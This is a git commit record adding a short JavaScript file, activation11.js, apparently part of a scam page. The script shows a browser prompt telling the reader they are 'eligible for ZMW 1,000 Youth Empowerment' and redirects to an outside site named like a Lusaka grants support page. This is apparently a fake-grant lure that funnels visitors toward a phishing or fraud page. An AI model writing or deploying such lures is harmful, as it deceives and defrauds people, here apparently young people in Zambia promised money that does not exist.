3d4020d0a7bf7235bbdc9d19eaac38535e7be76f
graantx <slicer_sizzles9k@icloud.com>
2026-05-05 08:59:05 +0100

    Create activation11.js

---
+++ activation11.js
@@ -0,0 +1,11 @@
+
+var password = 'ZMW 1,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ZMW 1,000 Youth Empowerment. Click OK to activate now.',
+  'ZMW 1,000'
+);
+
+if (password !== 'ZMW 1,000') {
+    location.href = 'https://rhud.info/Lusaka-Support-Grants.html';
+}
